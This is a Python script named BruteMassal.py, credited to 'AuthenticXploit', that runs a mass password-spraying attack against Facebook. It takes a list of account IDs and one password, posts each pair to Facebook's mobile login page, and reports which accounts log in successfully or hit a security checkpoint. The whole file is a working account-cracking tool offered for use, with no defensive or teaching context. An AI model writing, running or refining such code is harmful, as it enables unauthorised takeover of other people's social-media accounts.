#!/usr/bin/env python
# encoding: utf-8
"""
BruteMassal.py

Created by AuthenticXploit on 09/07/2021.
Copyright (c) 2021 Copyright Holder. All rights reserved.
"""

try:
    import os
    import sys
    import time
    import requests
    import mechanize
    import bs4
    from os import system
    from time import sleep
    from sys import exit
except ImportError as f:
    clearScr()
    print("\033[32;1m[\033[31;1m!\033[32;1m] \033[0;33mError \033[31;1m: \033[36;1m{}".format(f))
if sys.version[0] in "2":
    exit("\033[32;1m[\033[31;1m!\033[32;1m]\033[0;33m error use python version 3\x1b[0m")

def clearScr():
    """
    clear the screen in case of GNU/Linux or Windows
    """
    if sys.platform == "linux2":
        system("clear")
    elif sys.platform == "win32":
        system("cls")
    else:
        system("clear")

def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        sleep(2.0 / 90)

system("clear")
slowprint("""\033[36;1m
  ____             _       _____ ____  
 | __ ) _ __ _   _| |_ ___|  ___| __ ) 
 |  _ \| '__| | | | __/ _ \ |_  |  _ \\\033[1;97m
 | |_) | |  | |_| | ||  __/  _| | |_) |
 |____/|_|   \__,_|\__\___|_|   |____/ 
                     
     \x1b[1;97m Author   \033[31;1m:  \033[32mAuthenticXploit
     \x1b[1;97m Type     \033[31;1m:  \033[32mBruteForce
     \x1b[1;97m Version  \033[31;1m:  \033[32m0.3
     \x1b[1;97m Contact  \033[31;1m:  \033[32mhttps://t.me/AuthenticXploit
     \x1b[1;97m                 
""")

# LIST ID PASSWORD
list = input("\033[37;1mInput list ID       \033[31;1m: \033[33;1m")
pasw = input("\033[37;1mPassword To Crack   \033[31;1m: \033[33;1m")
print("\033[36;1m[\033[31;1m-\033[36;1m] \033[33;1mCracking, please wait ...\n")

def brute(list,pasw):
    try:
        link = "https://m.facebook.com/login.php"
        data = {"email":list, "pass":pasw}
        r = requests.post(link, data=data)
        if "m_sess" in r.url:
            print("\033[32;1m[OK] \033[37;1m{} => \033[32;1m{}".format(list,pasw))
        elif "checkpoint" in r.url:
            print("\033[33;1m[CP] \033[37;1m{} => \033[33;1m{}".format(list,pasw))
        else:
            print("\033[31;1m[FL] \033[37;1m{}".format(list))
    except requests.exceptions.ConnectionError:
        print("\n\033[32;1m[\033[31;1m!\033[32;1m]\033[33;1m No Connection")
        sleep(2)
        print("\033[32;1m[\033[31;1m!\033[32;1m] \033[31;1mExit\x1b[0m")
        exit()

def main(list,pasw):
    file = open(list, "r").readlines()
    for i in file:
        brute(i.strip(),pasw)
try:
    main(list,pasw)
except IOError:
    print("\n\033[32;1m[\033[31;1m!\033[32;1m]\033[33;1m File wordlist \033[36;1m{} \033[33;1mNot Found\x1b[0m".format(list))
    exit()
